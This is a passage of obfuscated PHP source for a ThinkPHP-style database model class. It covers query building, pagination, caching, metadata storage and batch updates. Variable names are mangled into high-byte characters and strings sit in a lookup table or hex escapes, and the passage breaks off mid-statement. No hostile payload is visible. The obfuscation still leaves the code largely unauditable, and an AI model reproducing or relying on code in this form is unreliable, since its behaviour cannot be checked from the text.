$¯™ö†”³ = $this->_parseOptions(); $ñÚŒÏœã = $this->db->parseSql($ñÚŒÏœã, $¯™ö†”³); } elseif (is_array($‘Ìò“Û)) { $‘Ìò“Û = array_map(array($this->db, $ò‰ñçœ»[343]), $‘Ìò“Û); $ñÚŒÏœã = vsprintf($ñÚŒÏœã, $‘Ìò“Û); } else { $ñÚŒÏœã = strtr($ñÚŒÏœã, array($ò‰ñçœ»[344] => $this->getTableName(), $ò‰ñçœ»[345] => think_config($ò‰ñçœ»[244]))); } $this->db->setModel($this->name); return $ñÚŒÏœã; } public function db($ÁÁ‹Ì = '', $ª¬›¹¨Ï = '', $Ú•ÍÚÀ = array()) { $¿âØù€ã =& $_SERVER[å¸¿•¶£]; if ($¿âØù€ã[12] === $ÁÁ‹Ì && $this->db) { return $this->db; } static $´³µñ¥æ = array(); static $îóã¶¸ = array(); if (!isset($îóã¶¸[$ÁÁ‹Ì]) || isset($îóã¶¸[$ÁÁ‹Ì]) && $ª¬›¹¨Ï && $´³µñ¥æ[$ÁÁ‹Ì] != $ª¬›¹¨Ï) { if (!empty($ª¬›¹¨Ï) && is_string($ª¬›¹¨Ï) && !1 === strpos($ª¬›¹¨Ï, $¿âØù€ã[8])) { $ª¬›¹¨Ï = think_config($ª¬›¹¨Ï); } $ÁÁ‹Ì = think_guid($ª¬›¹¨Ï); $îóã¶¸[$ÁÁ‹Ì] = Db::getInstance($ª¬›¹¨Ï); } elseif (NULL === $ª¬›¹¨Ï) { $îóã¶¸[$ÁÁ‹Ì]->close(); unset($îóã¶¸[$ÁÁ‹Ì]); return; } if (!empty($Ú•ÍÚÀ)) { if (is_string($Ú•ÍÚÀ)) { parse_str($Ú•ÍÚÀ, $Ú•ÍÚÀ); } foreach ($Ú•ÍÚÀ as $èÁˆæ => $ßõ’Š‰Ü) { $this->setProperty($èÁˆæ, $ßõ’Š‰Ü); } } $´³µñ¥æ[$ÁÁ‹Ì] = $ª¬›¹¨Ï; $this->db = $îóã¶¸[$ÁÁ‹Ì]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Ñ­úÁ¾Ş = get_class($this); if ($Ñ­úÁ¾Ş == $_SERVER[å¸¿•¶£][346]) { return $this->name; } $this->name = substr($Ñ­úÁ¾Ş, 0, -5); } return $this->name; } public function getTableName() { $ï™€ÅÂ± =& $_SERVER[å¸¿•¶£]; if (empty($this->trueTableName)) { $¦—é»ì = !empty($this->tablePrefix) ? $this->tablePrefix : $ï™€ÅÂ±[12]; if (!empty($this->tableName)) { $¦—é»ì .= $this->tableName; } else { $¦—é»ì .= think_parse_name($this->name); } $this->trueTableName = strtolower($¦—é»ì); } return (!empty($this->dbName) ? $this->dbName . $ï™€ÅÂ±[10] : $ï™€ÅÂ±[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÉààËóĞ =& $_SERVER[å¸¿•¶£]; return isset($this->fields[$ÉààËóĞ[251]]) ? $this->fields[$ÉààËóĞ[251]] : $this->pk; } public function getDbFields() { $ä´Œü‰» =& $_SERVER[å¸¿•¶£]; if (isset($this->options[$ä´Œü‰»[279]])) { $âµçµöı = $this->db->getFields($this->options[$ä´Œü‰»[279]]); return $âµçµöı ? array_keys($âµçµöı) : !1; } if ($this->fields) { $âµçµöı = $this->fields; unset($âµçµöı[$ä´Œü‰»[250]], $âµçµöı[$ä´Œü‰»[251]], $âµçµöı[$ä´Œü‰»[252]], $âµçµöı[$ä´Œü‰»[249]]); return $âµçµöı; } return !1; } public function data($¢Ç”ì¬› = '') { $òò’Ø«ç =& $_SERVER[å¸¿•¶£]; if ($òò’Ø«ç[12] === $¢Ç”ì¬› && !empty($this->data)) { return $this->data; } if (is_object($¢Ç”ì¬›)) { $¢Ç”ì¬› = get_object_vars($¢Ç”ì¬›); } elseif (is_string($¢Ç”ì¬›)) { parse_str($¢Ç”ì¬›, $¢Ç”ì¬›); } elseif (!is_array($¢Ç”ì¬›)) { think_exception(think_lang($òò’Ø«ç[271])); } $this->data = $¢Ç”ì¬›; return $this; } public function join($´ºÙ¬ƒç) { $Ûãæ°“‘ =& $_SERVER[å¸¿•¶£]; if (is_array($´ºÙ¬ƒç)) { $this->options[$Ûãæ°“‘[282]] = $´ºÙ¬ƒç; } elseif (!empty($´ºÙ¬ƒç)) { $this->options[$Ûãæ°“‘[282]][] = $´ºÙ¬ƒç; } return $this; } public function union($û¥”’Íè, $ÍÕÍÇ¼ñ = false) { $Šå¢Œ­² =& $_SERVER[å¸¿•¶£]; if (empty($û¥”’Íè)) { return $this; } if ($ÍÕÍÇ¼ñ) { $this->options[$Šå¢Œ­²[347]][$Šå¢Œ­²[348]] = !0; } if (is_object($û¥”’Íè)) { $û¥”’Íè = get_object_vars($û¥”’Íè); } if (is_string($û¥”’Íè)) { $êõ©­¤¤ = $û¥”’Íè; } elseif (is_array($û¥”’Íè)) { if (isset($û¥”’Íè[0])) { $this->options[$Šå¢Œ­²[347]] = array_merge($this->options[$Šå¢Œ­²[347]], $û¥”’Íè); return $this; } else { $êõ©­¤¤ = $û¥”’Íè; } } else { think_exception(think_lang($Šå¢Œ­²[271])); } $this->options[$Šå¢Œ­²[347]][] = $êõ©­¤¤; return $this; } public function cache($Ó§ÁÉ‡Ä = true, $“‘ÅÂÁÃ = null, $¸İ»ÊÆ³ = '') { $½Şš¶Å =& $_SERVER[å¸¿•¶£]; if (!1 !== $Ó§ÁÉ‡Ä) { $this->options[$½Şš¶Å[349]] = array($½Şš¶Å[94] => $Ó§ÁÉ‡Ä, $½Şš¶Å[339] => $“‘ÅÂÁÃ, $½Şš¶Å[33] => $¸İ»ÊÆ³); } return $this; } public function field($ıë¸•ë, $Ç×æöó‘ = false) { $—®Ìµ…€ =& $_SERVER[å¸¿•¶£]; if (!0 === $ıë¸•ë) { $Œ¾ß¯ = $this->getDbFields(); $ıë¸•ë = $Œ¾ß¯ ? $Œ¾ß¯ : $—®Ìµ…€[189]; } elseif ($Ç×æöó‘) { if (is_string($ıë¸•ë)) { $ıë¸•ë = explode($—®Ìµ…€[50], $ıë¸•ë); } $Œ¾ß¯ = $this->getDbFields(); $ıë¸•ë = $Œ¾ß¯ ? array_diff($Œ¾ß¯, $ıë¸•ë) : $ıë¸•ë; } $this->options[$—®Ìµ…€[273]] = $ıë¸•ë; return $this; } public function scope($§«¼ã˜ = '', $ºúõ¹¨â = NULL) { $Ç£°±øŞ =& $_SERVER[å¸¿•¶£]; if ($Ç£°±øŞ[12] === $§«¼ã˜) { if (isset($this->_scope[$Ç£°±øŞ[37]])) { $Ş´€¨îò = $this->_scope[$Ç£°±øŞ[37]]; } else { return $this; } } elseif (is_string($§«¼ã˜)) { $Ó´û’İ— = explode($Ç£°±øŞ[50], $§«¼ã˜); $Ş´€¨îò = array(); foreach ($Ó´û’İ— as $å¸©™¡) { if (!isset($this->_scope[$å¸©™¡])) { continue; } $Ş´€¨îò = array_merge($Ş´€¨îò, $this->_scope[$å¸©™¡]); } if (!empty($ºúõ¹¨â) && is_array($ºúõ¹¨â)) { $Ş´€¨îò = array_merge($Ş´€¨îò, $ºúõ¹¨â); } } elseif (is_array($§«¼ã˜)) { $Ş´€¨îò = $§«¼ã˜; } if (is_array($Ş´€¨îò) && !empty($Ş´€¨îò)) { $this->options = array_merge($this->options, array_change_key_case($Ş´€¨îò)); } return $this; } public function where($ƒõ—àüï, $–ÀšğŞ = null) { $¤ö½Äİ =& $_SERVER[å¸¿•¶£]; if (!is_null($–ÀšğŞ) && is_string($ƒõ—àüï)) { if (!is_array($–ÀšğŞ)) { $–ÀšğŞ = func_get_args(); array_shift($–ÀšğŞ); } $–ÀšğŞ = array_map(array($this->db, $¤ö½Äİ[343]), $–ÀšğŞ); $ƒõ—àüï = vsprintf($ƒõ—àüï, $–ÀšğŞ); } elseif (is_object($ƒõ—àüï)) { $ƒõ—àüï = get_object_vars($ƒõ—àüï); } elseif (is_array($ƒõ—àüï)) { foreach ($ƒõ—àüï as $‹Ëóş¿Ï => $Ä’ıÉè¼) { if ((is_numeric($‹Ëóş¿Ï) || !$‹Ëóş¿Ï) && is_string($Ä’ıÉè¼)) { if (strpos($Ä’ıÉè¼, $¤ö½Äİ[350]) === 0) { continue; } think_trace($¤ö½Äİ[351], $¤ö½Äİ[12], $¤ö½Äİ[49]); die; } } } if (is_string($ƒõ—àüï) && $¤ö½Äİ[12] != $ƒõ—àüï) { $öèê– = array(); $öèê–[$¤ö½Äİ[352]] = $ƒõ—àüï; $ƒõ—àüï = $öèê–; } if (isset($this->options[$¤ö½Äİ[275]])) { $this->options[$¤ö½Äİ[275]] = array_merge($this->options[$¤ö½Äİ[275]], $ƒõ—àüï); } else { $this->options[$¤ö½Äİ[275]] = $ƒõ—àüï; } return $this; } public function limit($è€Òº¯•, $ñèî½¸Œ = null) { $Ÿ¿´£°‡ =& $_SERVER[å¸¿•¶£]; $this->options[$Ÿ¿´£°‡[292]] = is_null($ñèî½¸Œ) ? $è€Òº¯• : $è€Òº¯• . $Ÿ¿´£°‡[50] . $ñèî½¸Œ; return $this; } public function page($Î¡Ï‰, $¤ßÏ§ºÖ = null) { $İ¾ºû³¤ =& $_SERVER[å¸¿•¶£]; $this->options[$İ¾ºû³¤[353]] = is_null($¤ßÏ§ºÖ) ? $Î¡Ï‰ : $Î¡Ï‰ . $İ¾ºû³¤[50] . $¤ßÏ§ºÖ; return $this; } public function comment($ü­ŠŸİı) { $this->options[$_SERVER[å¸¿•¶£][354]] = $ü­ŠŸİı; return $this; } public function setProperty($ø¿ì Ñ, $¿÷£¹ƒˆ) { if (property_exists($this, $ø¿ì Ñ)) { $this->{$ø¿ì Ñ} = $¿÷£¹ƒˆ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\146\x79\124\x69\155\x65", "\x74\151\x6d\x65", "\x69\156\x73\x65\162\164\54\x75\x70\x64\141\164\145", "\146\x75\156\x63\164\151\157\156"), array("\143\x72\145\141\164\x65\124\x69\x6d\x65", "\x74\151\x6d\145", "\151\156\x73\145\162\x74", "\146\165\156\143\x74\x69\157\156")); public function setDataAuto($ ”‰Æ) { $this->dataAuto = $ ”‰Æ; } public function __construct($†«“’¦ = '', $ÏÔ“ÀË³ = '', $ëç¾§÷Ã = '') { parent::__construct($†«“’¦, $ÏÔ“ÀË³, $ëç¾§÷Ã); } protected $tableMeta = array(); protected function _beforeInsert(&$Šó…øâ½, $¬ìŠªÕ) { $ùÇ¥¬Ã =& $_SERVER[å¸¿•¶£]; if (!$this->checkDataAutoHas($ùÇ¥¬Ã[355])) { return; } $this->dataBeforeFilter($Šó…øâ½, $ùÇ¥¬Ã[355]); } protected function _beforeUpdate(&$Ãéæ—›‹, $òÎìì¸˜) { $èğóßğ =& $_SERVER[å¸¿•¶£]; if (!$this->checkDataAutoHas($èğóßğ[356])) { return; } $this->dataBeforeFilter($Ãéæ—›‹, $èğóßğ[356]); } protected function _afterSelect(&$ÚÅÏ¿½¦, $¼¨óç÷õ) { if (!is_array($ÚÅÏ¿½¦)) { return; } if (!$this->checkDataAutoHas($_SERVER[å¸¿•¶£][357])) { return; } foreach ($ÚÅÏ¿½¦ as &$ˆ×Œ‹æ¨) { $this->dataAfterFilter($ˆ×Œ‹æ¨); } unset($ˆ×Œ‹æ¨); } protected function _afterFind(&$ºóÃ¹¿, $Ø£Ší·™) { if (!is_array($ºóÃ¹¿)) { return; } if (!$this->checkDataAutoHas($_SERVER[å¸¿•¶£][357])) { return; } $this->dataAfterFilter($ºóÃ¹¿); } public static function textEncode($½Ÿéšâı) { if (!$½Ÿéšâı) { return $½Ÿéšâı; } $ÕÊˆ†Ş˜ = json_encode($½Ÿéšâı); $ÕÊˆ†Ş˜ = preg_replace_callback($_SERVER[å¸¿•¶£][358], function ($Ó“êÜÊ) { return addslashes($Ó“êÜÊ[0]); }, $ÕÊˆ†Ş˜); return json_decode($ÕÊˆ†Ş˜); } public static function textDecode($—àâÔç) { $š½Êñ¿ä =& $_SERVER[å¸¿•¶£]; $è¤Àõ³ = json_encode($—àâÔç); $è¤Àõ³ = preg_replace_callback($š½Êñ¿ä[359], function ($èÅ„îƒ) { return $_SERVER[å¸¿•¶£][97]; }, $è¤Àõ³); return json_decode($è¤Àõ³); } public function setAutoIncrement($É‹Ñğ¦–) { $Ú¸£»ìÏ = array($this->getPk() => $É‹Ñğ¦–); $Ù¿àÑ· = $this->data($Ú¸£»ìÏ)->add(); if ($Ù¿àÑ·) { $this->delete($Ù¿àÑ·); } } public function getAutoIncrement() { $– ÙÒİ˜ = $this->getTableName(); $µè¢ÙÊ’ = $this->max($this->getPk()); $ÓææİÎ® = $this->query("\x73\150\x6f\167\40\164\141\142\x6c\145\x20\x73\x74\141\164\x75\x73\40\x77\x68\x65\x72\145\40\x4e\141\x6d\x65\75\47{$– ÙÒİ˜}\47"); $–Øªõª = $ÓææİÎ®[0][$_SERVER[å¸¿•¶£][360]]; $ÅäŒÕØ€ = max($µè¢ÙÊ’, $–Øªõª); return $ÅäŒÕØ€; } protected function _callBefore($€«„´ï¯, $ª€±şÏ) { return $this->cacheCallCheck($€«„´ï¯, $ª€±şÏ, !1); } protected function _callAfter($Õ’Èï•Ş, $†ËŒïã) { return $this->cacheCallCheck($Õ’Èï•Ş, $†ËŒïã, !0); } protected function cacheFunctionAlias($ÀïùñÕ¹) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($›õ´±§‚, $üÊñºÔ, $«Ä·ïÃÄ = false) { $Úã‹¯±Ó = $this->cacheFunctionAlias($üÊñºÔ); if (!$Úã‹¯±Ó) { return; } foreach ($Úã‹¯±Ó as $âòºéğ‘ => $§ï»÷Ñ) { $Â··«Ğé = $§ï»÷Ñ[0]; $êŒãƒ× = explode($_SERVER[å¸¿•¶£][50], $§ï»÷Ñ[1]); if ($›õ´±§‚ == $âòºéğ‘) { return $this->cacheFunctionGet($âòºéğ‘, $Â··«Ğé); } if ($«Ä·ïÃÄ && in_array($›õ´±§‚, $êŒãƒ×)) { $this->cacheFunctionClear($âòºéğ‘, $Â··«Ğé); } } } public function cacheFunctionGet($–ƒ¢ÏÉ‘, $œáìëíŸ) { $•š“áøÖ = $this->cacheKeyMake($–ƒ¢ÏÉ‘, $œáìëíŸ); $Äïä±·û = Cache::get($•š“áøÖ); if (!is_array($Äïä±·û)) { $Äïä±·û = call_user_func_array(array($this, $–ƒ¢ÏÉ‘), array($œáìëíŸ, !0)); Cache::set($•š“áøÖ, $Äïä±·û); } return $Äïä±·û; } public function cacheFunctionClear($©ÄË¶âÅ, $´½™‹Ç°) { $¨´ù®úí = $´½™‹Ç°; if (!is_array($´½™‹Ç°)) { $¨´ù®úí = array($´½™‹Ç°); } foreach ($¨´ù®úí as $Öøˆ‹ôş) { $™÷Ïô°ô = $this->cacheKeyMake($©ÄË¶âÅ, $Öøˆ‹ôş); Cache::remove($™÷Ïô°ô); } } private function cacheKeyMake($ÚÑ“äıı, $Ä¬Æ—õ“) { $¢­‰’¯í =& $_SERVER[å¸¿•¶£]; return get_class($this) . $¢­‰’¯í[11] . $ÚÑ“äıı . $¢­‰’¯í[361] . $Ä¬Æ—õ“; } protected function selectPageReset() { $§ƒİÂû¿ =& $_SERVER[å¸¿•¶£]; if (isset($GLOBALS[$§ƒİÂû¿[362]])) { return; } $GLOBALS[$§ƒİÂû¿[362]] = isset($GLOBALS[$§ƒİÂû¿[7]][$§ƒİÂû¿[363]]) ? $GLOBALS[$§ƒİÂû¿[7]][$§ƒİÂû¿[363]] : !1; $GLOBALS[$§ƒİÂû¿[364]] = isset($GLOBALS[$§ƒİÂû¿[7]][$§ƒİÂû¿[353]]) ? $GLOBALS[$§ƒİÂû¿[7]][$§ƒİÂû¿[353]] : !1; $GLOBALS[$§ƒİÂû¿[7]][$§ƒİÂû¿[363]] = !1; $GLOBALS[$§ƒİÂû¿[7]][$§ƒİÂû¿[353]] = !1; } protected function selectPageRestore() { $Ø€çÍ™Ç =& $_SERVER[å¸¿•¶£]; if (!isset($GLOBALS[$Ø€çÍ™Ç[362]])) { return; } $GLOBALS[$Ø€çÍ™Ç[7]][$Ø€çÍ™Ç[363]] = $GLOBALS[$Ø€çÍ™Ç[362]]; $GLOBALS[$Ø€çÍ™Ç[7]][$Ø€çÍ™Ç[353]] = $GLOBALS[$Ø€çÍ™Ç[364]]; if ($GLOBALS[$Ø€çÍ™Ç[7]][$Ø€çÍ™Ç[363]] === !1) { unset($GLOBALS[$Ø€çÍ™Ç[7]][$Ø€çÍ™Ç[363]]); } if ($GLOBALS[$Ø€çÍ™Ç[7]][$Ø€çÍ™Ç[353]] === !1) { unset($GLOBALS[$Ø€çÍ™Ç[7]][$Ø€çÍ™Ç[353]]); } unset($GLOBALS[$Ø€çÍ™Ç[362]]); unset($GLOBALS[$Ø€çÍ™Ç[364]]); } protected function selectPage($¯£Úğˆ¾ = 200, $‹ƒ–Å ş = 1) { $ª„Àî´ =& $_SERVER[å¸¿•¶£]; global $in; $÷øñéˆ = $this->optionsValue(); $“ÂŠıˆï = 50000; $¯£Úğˆ¾ = isset($in[$ª„Àî´[363]]) && $in[$ª„Àî´[363]] ? $in[$ª„Àî´[363]] : $¯£Úğˆ¾; if ($¯£Úğˆ¾ === -1) { $in[$ª„Àî´[363]] = !1; $“ÂŠıˆï = 100000000; $¯£Úğˆ¾ = $“ÂŠıˆï; } $±ëÎ×õ = $÷øñéˆ; $±ëÎ×õ[$ª„Àî´[365]] = array(); $¯£Úğˆ¾ = intval($¯£Úğˆ¾); $¯£Úğˆ¾ = $¯£Úğˆ¾ <= 5 ? 5 : ($¯£Úğˆ¾ >= $“ÂŠıˆï ? $“ÂŠıˆï : $¯£Úğˆ¾); $‹ƒ–Å ş = intval(isset($in[$ª„Àî´[353]]) && $in[$ª„Àî´[353]] ? $in[$ª„Àî´[353]] : $‹ƒ–Å ş); $‹ƒ–Å ş = $‹ƒ–Å ş <= 1 ? 1 : $‹ƒ–Å ş; $ÕÚ˜å¸À = array(); $Š øıÅ  = 1; if ($‹ƒ–Å ş == 1 && $Š øıÅ ) { $this->optionsValue($÷øñéˆ); $ÕÚ˜å¸À = $this->page($‹ƒ–Å ş, $¯£Úğˆ¾)->select(); $•“Ã“ = is_array($ÕÚ˜å¸À) ? count($ÕÚ˜å¸À) : 0; if ($•“Ã“ < $¯£Úğˆ¾) { $¼¨«°í· = 1; } else { $this->optionsValue($±ëÎ×õ); $•“Ã“ = intval($this->count()); $¼¨«°í· = ceil($•“Ã“ / $¯£Úğˆ¾); } } else { $this->optionsValue($±ëÎ×õ); $•“Ã“ = intval($this->count()); $¼¨«°í· = ceil($•“Ã“ / $¯£Úğˆ¾); $‹ƒ–Å ş = $‹ƒ–Å ş >= $¼¨«°í· ? $¼¨«°í· : $‹ƒ–Å ş; $this->optionsValue($÷øñéˆ); $ÕÚ˜å¸À = $this->page($‹ƒ–Å ş, $¯£Úğˆ¾)->select(); } if (!is_array($ÕÚ˜å¸À)) { $ÕÚ˜å¸À = array(); } if ($¼¨«°í· == 1) { $•“Ã“ = count($ÕÚ˜å¸À); } $üûÊûÄµ = array($ª„Àî´[366] => array($ª„Àî´[367] => $•“Ã“, $ª„Àî´[363] => $¯£Úğˆ¾, $ª„Àî´[353] => $‹ƒ–Å ş, $ª„Àî´[368] => $¼¨«°í·), $ª„Àî´[369] => $ÕÚ˜å¸À); return $üûÊûÄµ; } protected function checkLength($ñ”—ƒÎ, $ÕÔäàÂ = 0, $éêøèã = '') { $Å‰Ø•â¬ =& $_SERVER[å¸¿•¶£]; $ÕÔäàÂ = $ÕÔäàÂ ? $ÕÔäàÂ : 65536; if (!$ñ”—ƒÎ || strlen($ñ”—ƒÎ) < $ÕÔäàÂ) { return; } $éêøèã = $éêøèã ? $éêøèã . $Å‰Ø•â¬[71] : $Å‰Ø•â¬[12]; show_json($éêøèã . LNG($Å‰Ø•â¬[370]) . "\50{$ÕÔäàÂ}\51", !1); } protected function metaSet($ç¼€¯§, $º½ãÊ = null, $¶ëËâû¢ = null) { $ºßãÚ° =& $_SERVER[å¸¿•¶£]; if (!$this->tableMeta || !$ç¼€¯§) { return !1; } $ÈœÚ€œÚ = $this->tableMeta[$ºßãÚ°[371]]; $›¬Øğ×Ş = $this->tableMeta[$ºßãÚ°[372]]; $äÊîÜĞ¦ = Model($›¬Øğ×Ş); $°Óã•× = array($ÈœÚ€œÚ => $ç¼€¯§, $ºßãÚ°[373] => $º½ãÊ); if (is_null($º½ãÊ)) { return $äÊîÜĞ¦->where(array($ÈœÚ€œÚ => $ç¼€¯§))->delete(); } if (is_null($¶ëËâû¢) && is_string($º½ãÊ)) { return $äÊîÜĞ¦->where($°Óã•×)->delete(); } $èìÏàÔ = is_array($º½ãÊ) ? $º½ãÊ : array(); if (is_string($º½ãÊ)) { $èìÏàÔ[$º½ãÊ] = $¶ëËâû¢; } $ÑŞä¿Œ = array(); foreach ($èìÏàÔ as $æÖ¨ù‹¹ => $ï°³£ßæ) { if (is_null($ï°³£ßæ) && is_string($æÖ¨ù‹¹)) { $äÊîÜĞ¦->where(array($ÈœÚ€œÚ => $ç¼€¯§, $ºßãÚ°[373] => $æÖ¨ù‹¹))->delete(); continue; } $this->checkLength($ï°³£ßæ, !1, $›¬Øğ×Ş . $ºßãÚ°[4] . $æÖ¨ù‹¹); $ÑŞä¿Œ[] = array($ÈœÚ€œÚ => $ç¼€¯§, $ºßãÚ°[94] => $æÖ¨ù‹¹, $ºßãÚ°[374] => $ï°³£ßæ); } $â®×­©» = $ºßãÚ°[375] . $›¬Øğ×Ş; CacheLock::lock($â®×­©»); $äÊîÜĞ¦->where(array($ÈœÚ€œÚ => $ç¼€¯§))->addAll($ÑŞä¿Œ, array(), !0); CacheLock::unlock($â®×­©»); return !0; } public function metaGet($„ÎÕè‡´, $†ø»ÖÓÛ = false) { $ü¡”Âî— =& $_SERVER[å¸¿•¶£]; if (!$this->tableMeta) { return array(); } $ÂÚì¦–µ = $this->tableMeta[$ü¡”Âî—[371]]; $’îœ—©è = Model($this->tableMeta[$ü¡”Âî—[372]]); if ($†ø»ÖÓÛ) { $¤ó§…ù˜ = array($ÂÚì¦–µ => $„ÎÕè‡´, $ü¡”Âî—[94] => $†ø»ÖÓÛ); return $’îœ—©è->where($¤ó§…ù˜)->getField($ü¡”Âî—[374]); } $¤ó§…ù˜ = array($ÂÚì¦–µ => $„ÎÕè‡´); $òŞ“Ï“ô = $’îœ—©è->field($ü¡”Âî—[376])->where($¤ó§…ù˜)->select(); $òŞ“Ï“ô = array_to_keyvalue($òŞ“Ï“ô, $ü¡”Âî—[94], $ü¡”Âî—[374]); return $òŞ“Ï“ô; } private function checkDataAutoHas($€„È¦«›) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÁØŠÊíƒ) { if (in_array($€„È¦«›, explode($_SERVER[å¸¿•¶£][50], $ÁØŠÊíƒ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ÚŠÌÁ², $º §÷–â) { $®µ«í¤‹ =& $_SERVER[å¸¿•¶£]; if (!is_array($ÚŠÌÁ²)) { return; } foreach ($this->dataAuto as $ÌëÉé¥Â) { $ëáìĞ—ª = $ÌëÉé¥Â[0]; if (!in_array($º §÷–â, explode($®µ«í¤‹[50], $ÌëÉé¥Â[2]))) { continue; } switch (trim($ÌëÉé¥Â[3])) { case $®µ«í¤‹[321]: case $®µ«í¤‹[322]: $Ş¿Óö² = $ÌëÉé¥Â[1]; $¦Ù±†û° = isset($ÌëÉé¥Â[4]) ? (array) $ÌëÉé¥Â[4] : array(); if ($Ş¿Óö² == $®µ«í¤‹[180] && array_key_exists($ëáìĞ—ª, $ÚŠÌÁ²)) { if (!$ÚŠÌÁ²[$ëáìĞ—ª]) { unset($ÚŠÌÁ²[$ëáìĞ—ª]); } break; } if (isset($ÚŠÌÁ²[$ëáìĞ—ª])) { array_unshift($¦Ù±†û°, $ÚŠÌÁ²[$ëáìĞ—ª]); } if ($®µ«í¤‹[321] == $ÌëÉé¥Â[3]) { $ÚŠÌÁ²[$ëáìĞ—ª] = call_user_func_array($Ş¿Óö², $¦Ù±†û°); } else { $ÚŠÌÁ²[$ëáìĞ—ª] = call_user_func_array(array(&$this, $Ş¿Óö²), $¦Ù±†û°); } break; case $®µ«í¤‹[270]: if (isset($ÚŠÌÁ²[$ëáìĞ—ª]) && $ÚŠÌÁ²[$ëáìĞ—ª]) { $ÚŠÌÁ²[$ëáìĞ—ª] = call_user_func_array(array(&$this, $ÌëÉé¥Â[1]), array($ÚŠÌÁ²[$ëáìĞ—ª])); } break; case $®µ«í¤‹[273]: $ÚŠÌÁ²[$ëáìĞ—ª] = $ÚŠÌÁ²[$ÌëÉé¥Â[1]]; break; case $®µ«í¤‹[294]: if (isset($ÚŠÌÁ²[$ëáìĞ—ª]) && !is_string($ÚŠÌÁ²[$ëáìĞ—ª])) { $ÚŠÌÁ²[$ëáìĞ—ª] = json_encode_force($ÚŠÌÁ²[$ëáìĞ—ª]); } break; case $®µ«í¤‹[323]: if ($ÚŠÌÁ²[$ëáìĞ—ª] === $®µ«í¤‹[12]) { unset($ÚŠÌÁ²[$ëáìĞ—ª]); } break; case $®µ«í¤‹[324]: $ÚŠÌÁ²[$ëáìĞ—ª] = $ÌëÉé¥Â[1]; default: break; } } if ($º §÷–â == $®µ«í¤‹[355]) { $›”®¥ş¤ = strtolower($this->db->getDbType()); if (strpos($›”®¥ş¤, $®µ«í¤‹[13]) !== 0) { return; } $…ƒÎ¹è± = $this->field(!0)->fields; $²¹…¥Å“ = $…ƒÎ¹è±[$®µ«í¤‹[252]]; if (isset($…ƒÎ¹è±[$®µ«í¤‹[251]])) { unset($²¹…¥Å“[$…ƒÎ¹è±[$®µ«í¤‹[251]]]); } foreach ($²¹…¥Å“ as $îÈÍÏ†ñ => $º §÷–â) { if (!isset($ÚŠÌÁ²[$îÈÍÏ†ñ])) { $ÚŠÌÁ²[$îÈÍÏ†ñ] = $®µ«í¤‹[12]; } } } } private function dataAfterFilter(&$¯Î¬æ†ë) { $…Ïˆ›ÂÊ =& $_SERVER[å¸¿•¶£]; foreach ($this->dataAuto as $ÖÊÒëß„) { $Ùãºà„á = $ÖÊÒëß„[0]; if (!isset($¯Î¬æ†ë[$Ùãºà„á])) { continue; } if (!in_array($…Ïˆ›ÂÊ[357], explode($…Ïˆ›ÂÊ[50], $ÖÊÒëß„[2]))) { continue; } switch (trim($ÖÊÒëß„[3])) { case $…Ïˆ›ÂÊ[321]: case $…Ïˆ›ÂÊ[322]: $ã£Õè£ = isset($ÖÊÒëß„[4]) ? (array) $ÖÊÒëß„[4] : array(); array_unshift($ã£Õè£, $¯Î¬æ†ë[$Ùãºà„á]); if (isset($ÖÊÒëß„[4]) && $ÖÊÒëß„[4] == $…Ïˆ›ÂÊ[377]) { $ã£Õè£ = array($¯Î¬æ†ë[$Ùãºà„á]); } if ($…Ïˆ›ÂÊ[321] == $ÖÊÒëß„[3]) { $¯Î¬æ†ë[$Ùãºà„á] = call_user_func_array($ÖÊÒëß„[1], $ã£Õè£); } else { $¯Î¬æ†ë[$Ùãºà„á] = call_user_func_array(array(&$this, $ÖÊÒëß„[1]), $ã£Õè£); } break; case $…Ïˆ›ÂÊ[270]: if (isset($¯Î¬æ†ë[$Ùãºà„á]) && $¯Î¬æ†ë[$Ùãºà„á]) { $¯Î¬æ†ë[$Ùãºà„á] = call_user_func_array(array(&$this, $ÖÊÒëß„[1]), array($¯Î¬æ†ë[$Ùãºà„á])); } break; case $…Ïˆ›ÂÊ[273]: $¯Î¬æ†ë[$Ùãºà„á] = $¯Î¬æ†ë[$ÖÊÒëß„[1]]; break; case $…Ïˆ›ÂÊ[294]: $©®çëØÖ = $¯Î¬æ†ë[$Ùãºà„á]; $¯Î¬æ†ë[$Ùãºà„á] = json_decode($©®çëØÖ, !0); if (is_null($¯Î¬æ†ë[$Ùãºà„á])) { $¯Î¬æ†ë[$Ùãºà„á] = $©®çëØÖ; } break; case $…Ïˆ›ÂÊ[323]: if ($¯Î¬æ†ë[$Ùãºà„á] === $…Ïˆ›ÂÊ[12]) { unset($¯Î¬æ†ë[$Ùãºà„á]); } break; case $…Ïˆ›ÂÊ[324]: $¯Î¬æ†ë[$Ùãºà„á] = $ÖÊÒëß„[1]; break; default: break; } } } public function saveAll($©°¸‘ğ“) { $ÅŠĞÉá¯ =& $_SERVER[å¸¿•¶£]; $Ç¯ ¬©Å = $this->tablePrefix . $this->tableName; $„ŠÄ£š¾ = self::SQL_WHERE_IN_CHUNK; $©°¸‘ğ“ = is_array($©°¸‘ğ“) ? $©°¸‘ğ“ : array(); $ó«ç…¯ò = $ÅŠĞÉá¯[378]; $ÕöÉ”¶ = 0; $¥ øâĞ = array(); $ğóÖ¯¢½ = count($©°¸‘ğ“); for ($÷¾í¾… = 0; $÷¾í¾… < $ğóÖ¯¢½; $÷¾í¾…++) { $Ôïòº›ı = $©°¸‘ğ“[$÷¾í¾…]; if (!is_array($Ôïòº›ı) || count($Ôïòº›ı) != 4) { continue; } $½Ë¹ã¼Ì = "\125\120\104\101\x54\105\x20\140{$Ç¯ 